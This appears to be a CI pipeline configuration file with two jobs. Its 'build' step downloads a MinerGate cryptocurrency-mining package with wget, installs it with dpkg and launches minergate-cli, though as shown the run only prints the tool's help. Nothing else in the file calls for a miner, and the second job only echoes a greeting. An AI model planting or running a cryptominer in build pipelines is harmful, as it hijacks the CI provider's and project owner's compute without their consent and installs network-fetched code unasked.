box:
  id: ubuntu
build:
  steps:
    - script:
        code: apt-get update && apt-get install -y wget && apt-get -f install && sudo apt update && sudo apt install -y ocl-icd-opencl-dev && wget https://download.minergate.com/xfast-ubuntu-cli-amd && dpkg -i xfast-ubuntu-cli-amd && cd minergate-cli && ./minergate-cli --help

hello-again:
  box: ubuntu
  services:
    - mongo:2.2.7
  steps:
    - script:
        code: echo "hello, again world!"
